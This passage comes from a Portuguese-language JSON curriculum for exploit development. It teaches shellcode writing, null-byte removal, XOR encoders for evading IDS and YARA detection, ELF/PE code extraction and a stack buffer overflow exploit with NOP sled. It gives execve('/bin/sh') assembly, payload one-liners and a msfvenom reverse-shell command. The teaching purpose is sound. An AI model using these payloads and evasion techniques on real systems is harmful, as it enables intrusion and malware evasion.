                                    "GDB debugger",
                                    "Metasploit msfvenom para comparação",
                                    "Ambiente VM Linux x86"
                                  ],
                                  "tips": "Use 'info registers' no GDB para monitorar ESP durante execução passo a passo.",
                                  "learningObjective": "Dominar métodos para derivar endereços dinâmicos a partir de registradores da CPU.",
                                  "commonMistakes": [
                                    "Assumir ESP fixo sem considerar alinhamento",
                                    "Usar offsets grandes que geram bytes nulos",
                                    "Esquecer de alinhar stack para 16 bytes"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Implementar operações de leitura e escrita sem bytes nulos",
                                  "subSteps": [
                                    "Aprender aritmética com XOR para calcular offsets (ex: XOR ECX,0x90909090).",
                                    "Usar instruções ADD/SUB com valores que evitam carry para zero.",
                                    "Implementar leitura via LODSB/LODSQ com ESI ajustado relativamente.",
                                    "Desenvolver escrita com STOSB/STOSQ ou MOV com registradores calculados.",
                                    "Evitar PUSH/POP com immediatos nulos usando registros intermediários."
                                  ],
                                  "verification": "Compilar shellcode de escrita simples (ex: escrever 0x41 em [addr]) e inspecionar com ndisasm para zero bytes.",
                                  "estimatedTime": "60 minutos",
                                  "materials": [
                                    "NASM",
                                    "pwntools Python lib",
                                    "GDB com pwndbg",
                                    "Exemplos de shellcodes do Exploit-DB"
                                  ],
                                  "tips": "Teste aritmética em calculadora hex para prever bytes nulos antes de codificar.",
                                  "learningObjective": "Construir instruções de memória que sejam nulas-free usando truques aritméticos e registradores.",
                                  "commonMistakes": [
                                    "XOR com valores que resultam em 00",
                                    "Usar MOV abs direto",
                                    "Ignorar endianness em multi-byte writes"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Construir e testar shellcode completo com acesso memória PIC",
                                  "subSteps": [
                                    "Combinar técnicas para shellcode que lê endereço de /bin/sh e escreve em memória.",
                                    "Integrar com execve stub usando offsets relativos de ESP.",
                                    "Otimizar tamanho removendo instruções desnecessárias.",
                                    "Testar injeção em buffer overflow vulnerável (ex: cyclic pattern com pwntools).",
                                    "Depurar falhas com GDB e ajustar offsets dinamicamente."
                                  ],
                                  "verification": "Executar shellcode em exploit PoC e confirmar spawn de shell sem crashes ou nulos detectados.",
                                  "estimatedTime": "90 minutos",
                                  "materials": [
                                    "Pwntools",
                                    "Vulnerable C program (ex: stack overflow demo)",
                                    "GDB",
                                    "strace para monitorar syscalls"
                                  ],
                                  "tips": "Use python -c 'print cyclic(100)' para encontrar offsets exatos em overflows.",
                                  "learningObjective": "Criar shellcode funcional PIC para cenários reais de exploração.",
                                  "commonMistakes": [
                                    "Não alinhar shellcode no buffer",
                                    "Esquecer ASLR/DEP mitigações em testes",
                                    "Sobrescrever RET sem preservar stack"
                                  ]
                                }
                              ],
                              "practicalExample": "Desenvolver um shellcode x86_32 PIC que usa ESP para calcular offset até um buffer, lê um endereço dinâmico via LODSB, aplica XOR para descriptografar e escreve payload em [EBX+offset] para spawn /bin/sh, sem nenhum \\x00 byte, testado em buffer overflow local.",
                              "finalVerifications": [
                                "Shellcode gera output hexdump sem bytes nulos.",
                                "Executa corretamente em GDB com ASLR off, spawnando shell.",
                                "Tamanho < 100 bytes e PIC comprovado em posições variadas.",
                                "Nenhum segmentation fault em escrita/leitura de memória.",
                                "Integra com execve usando syscalls relativas.",
                                "Passa por filtros de WAF que bloqueiam nulos."
                              ],
                              "assessmentCriteria": [
                                "Ausência total de bytes nulos em todas as instruções.",
                                "Correta derivação de endereços relativos via registradores.",
                                "Operações de read/write funcionais em offsets variáveis.",
                                "Eficiência: mínimo de instruções com tamanho otimizado.",
                                "Robustez: funciona em 32/64 bits com adaptações mínimas.",
                                "Documentação clara de técnicas usadas e depuração."
                              ],
                              "crossCurricularConnections": [
                                "Arquitetura de Computadores: Registradores e modelo de memória von Neumann.",
                                "Programação em C: Buffer overflows e ponteiros.",
                                "Análise Reversa: Disassembly e debugging com GDB.",
                                "Sistemas Operacionais: Syscalls e gerenciamento de processos.",
                                "Criptografia: Técnicas de ofuscação como XOR para evasão."
                              ],
                              "realWorldApplication": "Desenvolvimento de exploits para vulnerabilidades de buffer overflow em pentests (ex: Metasploit modules), CTFs como PicoCTF/Pwn2Own, bypass de proteções DEP/ASLR em pesquisa de segurança, e análise de malwares que usam shellcodes PIC para persistência."
                            },
                            "estimatedTime": "2 horas",
                            "difficulty": "advanced",
                            "status": "not_started",
                            "prerequisites": [
                              "10.1.4.4.1.1"
                            ]
                          }
                        ]
                      },
                      {
                        "id": "10.1.4.4.2",
                        "name": "Geração e Compilação de Shellcodes",
                        "description": "Processo de criação, compilação e extração de shellcodes em formato de bytes executáveis, considerando formatos de arquivos ELF e PE.",
                        "specificSkills": [
                          {
                            "id": "10.1.4.4.2.1",
                            "name": "Escrever e compilar shellcode simples com NASM",
                            "description": "Criar um shellcode assembly para spawnar shell (ex: /bin/sh), compilar com NASM para objeto (objdump ou ndisasm para extrair bytes) em 32/64 bits.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Configurar o ambiente de desenvolvimento para NASM",
                                  "subSteps": [
                                    "Instale o NASM em um ambiente Linux (ex: Ubuntu) usando 'sudo apt install nasm'.",
                                    "Instale ferramentas auxiliares: 'sudo apt install binutils gdb strace'.",
                                    "Crie um diretório de trabalho: 'mkdir shellcode_lab && cd shellcode_lab'.",
                                    "Verifique a instalação: 'nasm -v' e confirme versão >= 2.14.",
                                    "Prepare um editor de texto como vim ou VSCode com suporte a assembly."
                                  ],
                                  "verification": "Execute 'nasm -v' e confirme saída sem erros; liste ferramentas instaladas com 'dpkg -l | grep nasm'.",
                                  "estimatedTime": "15 minutos",
                                  "materials": [
                                    "Linux VM ou máquina (Ubuntu/Debian)",
                                    "Terminal",
                                    "Acesso root/sudo"
                                  ],
                                  "tips": "Use uma VM isolada para evitar riscos de segurança durante testes.",
                                  "learningObjective": "Configurar um ambiente seguro e funcional para desenvolvimento de assembly.",
                                  "commonMistakes": [
                                    "Não usar sudo para instalações",
                                    "Ignorar dependências como binutils",
                                    "Usar Windows sem WSL"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Escrever o código assembly para um shellcode simples de spawn shell",
                                  "subSteps": [
                                    "Abra um arquivo 'shellcode.asm' e defina seção .text sem global _start para position-independent code.",
                                    "Escreva código para sys_execve em x86-64: xor rax/rdi/rsi/rdx, mov al,59; mov rdi,binsh; syscall; binsh db '/bin/sh',0.",
                                    "Garanta null-free: evite bytes 0x00 usando técnicas como push/pop ou register manipulation.",
                                    "Adicione comentários explicando cada instrução e registradores.",
                                    "Salve e valide sintaxe manualmente (contar bytes para shellcode size)."
                                  ],
                                  "verification": "Revise o código linha por linha; conte bytes com 'xxd shellcode.asm | wc -c' aproximado.",
                                  "estimatedTime": "30 minutos",
                                  "materials": [
                                    "Editor de texto",
                                    "Documentação syscall x86-64 (man 2 execve)",
                                    "Referência shellcode como pwntools cheatsheet"
                                  ],
                                  "tips": "Comece com 64-bits para simplicidade; teste lógica em assembly não-shellcode primeiro.",
                                  "learningObjective": "Criar shellcode assembly funcional e null-free para execução de /bin/sh.",
                                  "commonMistakes": [
                                    "Inserir null bytes em strings",
                                    "Usar chamadas de sistema erradas (ex: 11 em vez de 59)",
                                    "Esquecer alinhamento de stack"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Compilar o shellcode com NASM para formato objeto",
                                  "subSteps": [
                                    "Compile para 64-bits: 'nasm -f elf64 shellcode.asm -o shellcode.o'.",
                                    "Linke se necessário: 'ld -m elf_x86_64 shellcode.o -o shellcode' (para teste).",
                                    "Para 32-bits alternativo: 'nasm -f elf32 shellcode.asm -o shellcode32.o'.",
                                    "Verifique erros de compilação e ajuste sintaxe.",
                                    "Execute teste básico: './shellcode' e confirme spawn de shell."
                                  ],
                                  "verification": "Confirme arquivos .o gerados com 'ls -la *.o'; execute binário e veja shell spawnar.",
                                  "estimatedTime": "20 minutos",
                                  "materials": [
                                    "NASM instalado",
                                    "ld linker",
                                    "Terminal"
                                  ],
                                  "tips": "Use -f macho64 para macOS se aplicável; sempre teste execução antes de extrair.",
                                  "learningObjective": "Compilar assembly em binários executáveis usando NASM e linker.",
                                  "commonMistakes": [
                                    "Formato errado (-f elf64 vs bin)",
                                    "Linker flags incorretas para arch",
                                    "Executar sem +x: chmod +x shellcode"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Extrair bytes do shellcode usando objdump ou ndisasm",
                                  "subSteps": [
                                    "Extraia bytes: 'objdump -d shellcode.o | grep -A 10 '<_start>' | cut -f2 | tr -d ' \\n' | sed 's/../\\\\x&/g''. ",
                                    "Alternativa ndisasm: 'ndisasm -b 64 shellcode.o > shellcode_disasm.txt' e copie bytes manualmente.",
                                    "Formate como array C: char shellcode[] = \"\\x48\\x31...\";.",
                                    "Teste shellcode: Crie C wrapper com memcpy para stack e execve.",
                                    "Valide: strace ./test_shellcode para confirmar execve(/bin/sh)."
                                  ],
                                  "verification": "Bytes extraídos spawnam shell quando injetados em programa C de teste; comprimento < 50 bytes ideal.",
                                  "estimatedTime": "25 minutos",
                                  "materials": [
                                    "objdump/ndisasm",
                                    "Compilador C (gcc)",
                                    "strace"
                                  ],
                                  "tips": "Automatize extração com script bash para reutilização; foque em minimal size.",
                                  "learningObjective": "Extrair e formatar shellcode bytes para uso em exploits ou injeções.",
                                  "commonMistakes": [
                                    "Extrair dados errados (headers ELF)",
                                    "Formato de byte errado (big/little endian)",
                                    "Não testar injeção"
                                  ]
                                }
                              ],
                              "practicalExample": "Código x86-64 shellcode.asm:\nsection .text\n    xor rax, rax\n    mov al, 59\n    mov rdi, binsh\n    xor rsi, rsi\n    xor rdx, rdx\n    syscall\n    binsh: db '/bin/sh', 0\nCompile: nasm -f elf64 shellcode.asm -o shellcode.o\nExtraia: objdump -d shellcode.o (bytes: \\x48\\x31\\xc0\\xb0\\x3b...). Teste spawna /bin/sh.",
                              "finalVerifications": [
                                "Shellcode compila sem erros em 64-bits.",
                                "Bytes extraídos têm < 30 bytes e são null-free.",
                                "Execução via C wrapper spawna shell interativa.",
                                "strace confirma única syscall execve(/bin/sh).",
                                "Funciona em 32-bits com adaptações (int 0x80).",
                                "Ndisasm reconstrói código original dos bytes."
                              ],
                              "assessmentCriteria": [
                                "Código assembly é position-independent e null-free.",
                                "Compilação/linkagem sem warnings/erros.",
                                "Bytes extraídos são precisos e executáveis.",
                                "Teste demonstra spawn shell funcional.",
                                "Documentação inclui explicações e tamanho.",
                                "Adaptação para 32/64 bits demonstrada."
                              ],
                              "crossCurricularConnections": [
                                "Programação de Sistemas (assembly low-level)",
                                "Sistemas Operacionais (syscalls e execve)",
                                "Engenharia Reversa (disassembly com objdump)",
                                "Segurança da Informação (exploit dev basics)",
                                "Arquitetura de Computadores (x86-64 registers)"
                              ],
                              "realWorldApplication": "Em pentesting e CTFs, gerar shellcodes personalizados para exploits de buffer overflow ou ROP chains, permitindo acesso remoto em avaliações de vulnerabilidades autorizadas."
                            },
                            "estimatedTime": "3 horas",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": [
                              "10.1.4.4.1.2"
                            ]
                          },
                          {
                            "id": "10.1.4.4.2.2",
                            "name": "Otimizar shellcodes para evitar bytes nulos e detecção",
                            "description": "Modificar shellcodes para eliminar bytes nulos, usar XOR para decodificação e testar em ambiente controlado com gdb para verificação de execução.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Analisar o Shellcode Original para Identificar Bytes Nulos",
                                  "subSteps": [
                                    "Desmonte o shellcode original usando ferramentas como objdump ou ndisasm para visualizar as instruções em assembly.",
                                    "Gere um dump hexadecimal do shellcode com xxd ou hexdump para escanear visualmente por bytes 0x00.",
                                    "Execute o shellcode em um ambiente isolado (como gdb) e observe falhas de execução causadas por null bytes em strings ou pushes.",
                                    "Documente todas as posições de bytes nulos e as instruções afetadas.",
                                    "Compare com um shellcode conhecido problemático, como um reverse shell com IP/porta contendo zeros."
                                  ],
                                  "verification": "Lista completa de bytes nulos identificados e relatório de disassembly sem erros.",
                                  "estimatedTime": "20 minutos",
                                  "materials": [
                                    "NASM",
                                    "GDB",
                                    "xxd ou hexdump",
                                    "Shellcode original em arquivo .bin"
                                  ],
                                  "tips": "Use gdb com 'x/50i $pc' para inspecionar memória durante execução.",
                                  "learningObjective": "Identificar precisamente bytes nulos e seu impacto na injeção de código.",
                                  "commonMistakes": [
                                    "Ignorar nulls em registradores durante runtime",
                                    "Confundir terminadores de string com nulls funcionais"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Projetar Codificação XOR para Eliminar Bytes Nulos",
                                  "subSteps": [
                                    "Escolha uma chave XOR (ex: 0xAA) que, quando aplicada ao payload, elimine todos os 0x00 sem introduzir novos.",
                                    "Escreva um script Python ou manualmente aplique XOR byte-a-byte ao shellcode original.",
                                    "Verifique o encoded payload com hexdump para confirmar ausência de 0x00.",
                                    "Teste a reversibilidade: XOR o encoded de volta para recuperar o original.",
                                    "Ajuste a chave iterativamente se nulls persistirem."
                                  ],
                                  "verification": "Encoded payload sem bytes 0x00 e decodificação perfeita do original.",
                                  "estimatedTime": "30 minutos",
                                  "materials": [
                                    "Python com script XOR simples",
                                    "Hex editor como xxd",
                                    "Shellcode original"
                                  ],
                                  "tips": "Escolha chaves ímpares ou teste múltiplas (0x55, 0xAA, 0x99) para evitar carry-over em instruções.",
                                  "learningObjective": "Dominar codificação XOR como técnica de ofuscação básica para evasão.",
                                  "commonMistakes": [
                                    "Chave que cria nulls no decoder loop",
                                    "Não testar todas as combinações de bytes"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Implementar o Stub de Decodificação XOR",
                                  "subSteps": [
                                    "Escreva assembly para um decoder: loop que XOR cada byte do payload com a chave e sobescreve in-place.",
                                    "Inclua salto para o payload decodificado após o loop (use registers como ESI/EDI para pointers).",
                                    "Adicione prologue para setup de stack e registers sem nulls.",
                                    "Monte o shellcode final: decoder + encoded payload.",
                                    "Compile com NASM para flat binary: 'nasm -f bin decoder.asm -o decoder.bin'."
                                  ],
                                  "verification": "Disassembly do binário final mostra decoder funcional sem nulls.",
                                  "estimatedTime": "40 minutos",
                                  "materials": [
                                    "NASM",
                                    "Editor de texto (vim/nano)",
                                    "Assembly template para XOR decoder"
                                  ],
                                  "tips": "Use 'jmp call pop' trick para obter endereço do payload sem nulls.",
                                  "learningObjective": "Construir decoders dinâmicos em assembly para shellcodes obfuscados.",
                                  "commonMistakes": [
                                    "Off-by-one no loop de decodificação",
                                    "Sobrescrita incompleta do payload"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Testar e Verificar Execução com GDB em Ambiente Controlado",
                                  "subSteps": [
                                    "Carregue o shellcode em GDB: 'gdb', 'set args', ou use exploit stub como (char *)shellcode.",
                                    "Defina breakpoints no início do decoder, fim do loop e entrada do payload.",
                                    "Execute 'run' e 'stepi' para observar decodificação e salto correto.",
                                    "Verifique registers e memória pós-decodificação com 'x/s $esp' ou 'info reg'.",
                                    "Teste evasão básica: injete em buffer overflow simulado e confirme execução sem crash."
                                  ],
                                  "verification": "Shellcode executa fully em GDB sem segfaults e payload decodificado corretamente.",
                                  "estimatedTime": "30 minutos",
                                  "materials": [
                                    "GDB",
                                    "Exploit PoC stub em C",
                                    "LD (linker)"
                                  ],
                                  "tips": "Use 'layout asm' no GDB para visualização side-by-side.",
                                  "learningObjective": "Debuggar e validar shellcodes obfuscados em runtime.",
                                  "commonMistakes": [
                                    "Breakpoint em endereço errado",
                                    "Não limpar ambiente de teste"
                                  ]
                                }
                              ],
                              "practicalExample": "Otimize um shellcode execve('/bin/sh') com null em push 0x00: encode com XOR 0xAA, implemente decoder loop (mov ecx,len; loop: xor [esi],key; inc esi; dec ecx; jnz loop; jmp payload), teste em GDB até spawn shell sem nulls.",
                              "finalVerifications": [
                                "Hexdump do shellcode final sem bytes 0x00.",
                                "GDB confirma decodificação e execução do payload original.",
                                "Execução em buffer overflow PoC spawna shell.",
                                "Tamanho otimizado < original + decoder overhead.",
                                "Nenhuma detecção por strings simples ou YARA básica.",
                                "Reversibilidade: re-encode/decode múltiplas vezes."
                              ],
                              "assessmentCriteria": [
                                "Ausência total de bytes nulos no shellcode final.",
                                "Decoder loop eficiente (sem loops infinitos ou overflows).",
                                "Execução bem-sucedida em GDB com breakpoints validados.",
                                "Documentação clara de análise, encoding e testes.",
                                "Criatividade na escolha de chave XOR e otimizações.",
                                "Tempo de execução < 2x do original."
                              ],
                              "crossCurricularConnections": [
                                "Programação em Assembly (escrita de loops e jumps)",
                                "Criptografia Básica (XOR como cifra stream)",
                                "Debugging e Reverse Engineering (GDB para análise dinâmica)",
                                "Análise de Malware (técnicas de ofuscação evasiva)",
                                "Desenvolvimento de Exploits (integração em payloads maiores)"
                              ],
                              "realWorldApplication": "Em pentesting e red teaming, otimizar shellcodes permite bypass de filtros de IDS/IPS que detectam null bytes, facilitando injeção em exploits reais como buffer overflows em serviços vulneráveis."
                            },
                            "estimatedTime": "4 horas",
                            "difficulty": "advanced",
                            "status": "not_started",
                            "prerequisites": [
                              "10.1.4.4.2.1"
                            ]
                          },
                          {
                            "id": "10.1.4.4.2.3",
                            "name": "Analisar formatos ELF e PE para extração de código",
                            "description": "Entender estruturas de ELF/PE, usar ferramentas como readelf/objdump para inspecionar e extrair seções de código executável para injeção.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Compreender as estruturas básicas dos formatos ELF e PE",
                                  "subSteps": [
                                    "Estude a documentação oficial do ELF (elf(5) man page ou specs do System V ABI).",
                                    "Analise diagramas do header ELF: ident, e_type, e_machine, e_entry, seções como .text, .data.",
                                    "Revise a estrutura PE: DOS header, NT headers, sections table (.text, .rdata), usando specs da Microsoft.",
                                    "Compare ELF vs PE: diferenças em headers, relocações e loading.",
                                    "Anote os offsets chave para seções executáveis (.text em ambos)."
                                  ],
                                  "verification": "Crie um diagrama manual dos headers ELF e PE e explique verbalmente ou por escrito as diferenças principais.",
                                  "estimatedTime": "45 minutos",
                                  "materials": [
                                    "Documentação ELF: https://refspecs.linuxfoundation.org/elf/elf.pdf",
                                    "PE specs: https://learn.microsoft.com/en-us/windows/win32/debug/pe-format",
                                    "Ferramentas de desenho como draw.io"
                                  ],
                                  "tips": "Use ferramentas visuais como hex editors (ex: HxD) para visualizar headers reais.",
                                  "learningObjective": "Identificar e descrever componentes chave dos formatos ELF e PE.",
                                  "commonMistakes": [
                                    "Confundir ELF com PE headers (ex: magic bytes 7F-45-4C-46 vs MZ)",
                                    "Ignorar endianness em e_machine",
                                    "Não notar alinhamentos de seções"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Instalar e usar ferramentas para inspecionar binários ELF",
                                  "subSteps": [
                                    "Instale binutils (readelf, objdump) via apt (Linux) ou brew (Mac).",
                                    "Compile um binário ELF simples: gcc -no-pie hello.c -o hello.elf.",
                                    "Execute 'readelf -h hello.elf' para header e 'readelf -S' para seções.",
                                    "Use 'objdump -d hello.elf' para disassemble .text e 'objdump -s -j .text' para dump hex.",
                                    "Identifique endereço de entry point e extraia manualmente bytes da seção .text."
                                  ],
                                  "verification": "Gere output de readelf/objdump e extraia 20 bytes iniciais da .text corretamente.",
                                  "estimatedTime": "60 minutos",
                                  "materials": [
                                    "GCC compiler",
                                    "Binutils: readelf, objdump",
                                    "Binário de teste: código C simples"
                                  ],
                                  "tips": "Use flags como -j .text para focar em seções específicas e redirecione output para arquivos.",
                                  "learningObjective": "Aplicar ferramentas para inspecionar e extrair dados de ELF.",
                                  "commonMistakes": [
                                    "Usar objdump sem -d para disassembly",
                                    "Confundir seções virtuais vs arquivos offsets",
                                    "Executar em binários stripped sem símbolos"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Inspecionar binários PE com ferramentas compatíveis",
                                  "subSteps": [
                                    "Compile binário PE: cl hello.c ou gcc -mwindows hello.c (MinGW).",
                                    "Instale objdump para PE (MinGW-w64) ou use dumpbin (Visual Studio).",
                                    "Execute 'objdump -p hello.exe' para headers PE e 'objdump -s -j .text' para dump.",
                                    "Use 'objdump -d hello.exe' para disassembly e identifique ImageBase, entry point.",
                                    "Extraia seção .text usando 'objdump -s -j .text hello.exe > text_dump.txt'."
                                  ],
                                  "verification": "Liste seções PE corretamente e extraia/dump hex da .text com precisão.",
                                  "estimatedTime": "60 minutos",
                                  "materials": [
                                    "MinGW-w64 ou Visual Studio",
                                    "Objdump para PE",
                                    "Binário PE de teste"
                                  ],
                                  "tips": "Em Windows, use Cygwin/MinGW para objdump cross-platform; evite paths com espaços.",
                                  "learningObjective": "Dominar inspeção de PE similar a ELF para extração de código.",
                                  "commonMistakes": [
                                    "Não ajustar para RVA vs file offsets",
                                    "Ignorar optional header fields como Subsystem",
                                    "Dump incorreto sem -j .text"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Extrair código executável de seções para injeção de shellcode",
                                  "subSteps": [
                                    "Use readelf/objdump para mapear offsets de .text em ELF/PE.",
                                    "Extraia bytes raw: dd if=hello.elf bs=1 skip=<offset> count=<size> of=text.elf ou similar para PE.",
                                    "Converta dump hex para binário usando xxd -r.",
                                    "Teste extração injetando em um stub simples (ex: loader em assembly).",
                                    "Compare extrações ELF/PE e note diferenças para shellcode portable."
                                  ],
                                  "verification": "Extraia .text de ambos formatos, gere binário raw e verifique hash MD5 igual ao dump original.",
                                  "estimatedTime": "45 minutos",
                                  "materials": [
                                    "dd ou xxd",
                                    "Hex editor",
                                    "Assembly loader simples (NASM)"
                                  ],
                                  "tips": "Calcule offsets precisos: file_offset = sh_offset para ELF; para PE, raw_data_offset.",
                                  "learningObjective": "Extrair seções de código de forma acionável para análise ou injeção.",
                                  "commonMistakes": [
                                    "Offsets errados (virtual vs file)",
                                    "Incluir padding/alignment no dump",
                                    "Não alinhar para injeção"
                                  ]
                                }
                              ],
                              "practicalExample": "Compile 'int main(){printf(\"Hello\");}' em ELF (Linux: gcc hello.c -o hello.elf) e PE (Windows MinGW: gcc hello.c -o hello.exe). Use readelf -S/objdump -s -j .text para identificar .text (ex: offset 0x400, size 0x50 em ELF). Extraia com dd: dd if=hello.elf bs=1 skip=1024 count=80 of=shellcode.bin. Disassemble com objdump -d shellcode.bin para confirmar código executável.",
                              "finalVerifications": [
                                "Descreva headers ELF/PE de um binário dado sem ferramentas.",
                                "Liste todas seções e offsets de .text usando readelf/objdump.",
                                "Extraia raw bytes de .text e gere dump hex idêntico.",
                                "Identifique entry point e disasm primeiro 10 instructions.",
                                "Compare extrações ELF/PE de mesmo código fonte.",
                                "Explique como offsets afetam injeção de shellcode."
                              ],
                              "assessmentCriteria": [
                                "Precisão na identificação de headers e seções (100% match com docs).",
                                "Eficiência no uso de ferramentas (completar extração em <10min por binário).",
                                "Qualidade da extração raw (hash MD5 válido, sem padding).",
                                "Compreensão de diferenças ELF/PE (explicação correta em relatório).",
                                "Aplicação prática: injeção bem-sucedida em loader teste.",
                                "Documentação clara de steps e outputs."
                              ],
                              "crossCurricularConnections": [
                                "Sistemas Operacionais: Mecanismos de loading ELF/PE.",
                                "Assembly: Disassembly e análise de instruções x86/ARM.",
                                "Engenharia Reversa: Uso em ferramentas como IDA Pro/Ghidra.",
                                "Segurança: Extração de shellcode em malware analysis.",
                                "Programação em C: Compilação e linking para gerar binários."
                              ],
                              "realWorldApplication": "Em análise de malware, extraia shellcode de seções .text em binários ELF/PE infectados para entender payloads; em desenvolvimento de exploits, isole código ROP gadgets de bibliotecas PE/ELF para chains de exploit."
                            },
                            "estimatedTime": "2 horas",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": [
                              "10.1.4.4.1.1"
                            ]
                          }
                        ]
                      },
                      {
                        "id": "10.1.4.4.3",
                        "name": "Técnicas de Injeção e Execução de Código Arbitrário",
                        "description": "Métodos de injeção de shellcodes via vulnerabilidades como buffer overflow, incluindo ROP para bypass de proteções.",
                        "specificSkills": [
                          {
                            "id": "10.1.4.4.3.1",
                            "name": "Explorar buffer overflow para injeção de shellcode",
                            "description": "Desenvolver exploit para stack overflow em C vulnerável, injetando shellcode e ajustando return address para ponteiro para o buffer (NOP sled).",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Configurar ambiente de teste e vulnerabilidade básica",
                                  "subSteps": [
                                    "Instale ferramentas essenciais: gcc, gdb e python3 em um ambiente Linux sem ASLR (echo 0 > /proc/sys/kernel/randomize_va_space).",
                                    "Crie um programa C vulnerável com buffer overflow usando strcpy sem verificações de tamanho.",
                                    "Compile o binário sem proteções: gcc -fno-stack-protector -z execstack -no-pie vuln.c -o vuln.",
                                    "Teste o crash básico fornecendo input longo via ./vuln $(python3 -c 'print(\"A\"*100)') para confirmar overflow.",
                                    "Use gdb para analisar o crash e inspecionar o stack com 'info registers' e 'x/20x $esp'."
                                  ],
                                  "verification": "O programa crash com segmentation fault e gdb mostra overflow no stack.",
                                  "estimatedTime": "1 hora",
                                  "materials": [
                                    "gcc",
                                    "gdb",
                                    "python3",
                                    "Editor de texto"
                                  ],
                                  "tips": "Use um VM isolado para evitar riscos; desative ASLR apenas para aprendizado.",
                                  "learningObjective": "Compreender configuração de ambiente controlado para exploração segura.",
                                  "commonMistakes": [
                                    "Esquecer de desabilitar ASLR/DEP",
                                    "Compilar com proteções padrão ativadas",
                                    "Não usar gdb para análise inicial"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Identificar offset exato do buffer até o return address",
                                  "subSteps": [
                                    "Execute gdb ./vuln e use pattern_create.rb do Metasploit ou python para gerar string única de 200 bytes.",
                                    "Forneça o pattern como argumento e anote o valor de EIP no crash (info registers eip).",
                                    "Use pattern_offset.rb ou calcule manualmente para encontrar o offset exato (ex: 76 bytes).",
                                    "Valide enviando input com offset + 'BBBB' e confirme EIP = 0x42424242.",
                                    "Documente o offset para uso no payload."
                                  ],
                                  "verification": "EIP controlado por bytes conhecidos após offset correto.",
                                  "estimatedTime": "45 minutos",
                                  "materials": [
                                    "gdb",
                                    "Metasploit pattern tools ou python script"
                                  ],
                                  "tips": "Salve comandos gdb em .gdbinit para reutilização rápida.",
                                  "learningObjective": "Dominar técnica de finding offset para controle de execução.",
                                  "commonMistakes": [
                                    "Cálculo incorreto de offset",
                                    "Ignorar alinhamento de stack",
                                    "Não validar com breakpoint"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Gerar shellcode simples em assembly",
                                  "subSteps": [
                                    "Escreva assembly x86 para execve('/bin/sh'): mov eax, 11; etc., terminando com exit.",
                                    "Monte com nasm -f elf32 shellcode.asm -o shellcode.o; ld -m elf_i386 shellcode.o -o shellcode.",
                                    "Extraia bytes com objdump -d shellcode | grep -A1 '<_start>:' e converta para \\\\\\\\xNN.",
                                    "Teste shellcode standalone: python3 -c 'print(\"\\x31\\xc0...\")' | ./shellcode.",
                                    "Meça tamanho do shellcode (tipicamente 23-30 bytes)."
                                  ],
                                  "verification": "Shellcode executa e spawna shell sem erros.",
                                  "estimatedTime": "1.5 horas",
                                  "materials": [
                                    "nasm",
                                    "ld",
                                    "objdump",
                                    "python3"
                                  ],
                                  "tips": "Use msfvenom -p linux/x86/shell_reverse_tcp LHOST=... -f raw para shellcode pronto inicialmente.",
                                  "learningObjective": "Criar código de máquina injetável para execução arbitrária.",
                                  "commonMistakes": [
                                    "Shellcode com null bytes (\\x00)",
                                    "Não alinhar para execve",
                                    "Falha em syscalls"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Construir payload completo com NOP sled e return address",
                                  "subSteps": [
                                    "Calcule endereços: use gdb 'disassemble main' para encontrar endereço do buffer (ex: 0xffffd000).",
                                    "Crie payload em python: 'A'*offset + NOP sled (100 '\\x90') + shellcode + endereço buffer (4x little-endian).",
                                    "Exemplo: python3 -c 'print(\"A\"*76 + \"\\x90\"*100 + shellcode + \"\\x00\\xd0\\xff\\xff\")' > payload.",
                                    "Teste payload: cat payload | ./vuln ou ./vuln $(cat payload).",
                                    "Ajuste endereço se necessário com cyclic patterns."
                                  ],
                                  "verification": "Exploit roda, pula NOP sled e executa shellcode (shell spawna).",
                                  "estimatedTime": "1 hora",
                                  "materials": [
                                    "python3",
                                    "gdb"
                                  ],
                                  "tips": "NOP sled grande tolera desalinhamentos; use pwntools para automação.",
                                  "learningObjective": "Montar exploit funcional com bypass de precisão via NOP.",
                                  "commonMistakes": [
                                    "Endereço em big-endian",
                                    "NOP sled muito curto",
                                    "Overflow não alinhado"
                                  ]
                                },
                                {
                                  "stepNumber": 5,
                                  "title": "Depurar, refinar e analisar execução",
                                  "subSteps": [
                                    "Execute em gdb: gdb ./vuln, set args $(python3 payload.py), run, set breakpoint no buffer.",
                                    "Use 'x/200x $esp' para visualizar payload no stack; stepi para single-step shellcode.",
                                    "Monitore registers durante execução: info registers após jump para NOP.",
                                    "Teste variações: mude shellcode para bind shell e refine para estabilidade.",
                                    "Documente lições: proteções como Canary, ASLR, NX mitigam isso."
                                  ],
                                  "verification": "Shellcode executa fully, spawna shell interativa sem crash.",
                                  "estimatedTime": "1 hora",
                                  "materials": [
                                    "gdb avançado"
                                  ],
                                  "tips": "Grave sessão gdb com 'script log.txt' para revisão.",
                                  "learningObjective": "Analisar e depurar exploits em ambiente controlado.",
                                  "commonMistakes": [
                                    "Não checar ASLR reativado",
                                    "Ignorar W^X protections",
                                    "Shellcode não nul-terminated"
                                  ]
                                }
                              ],
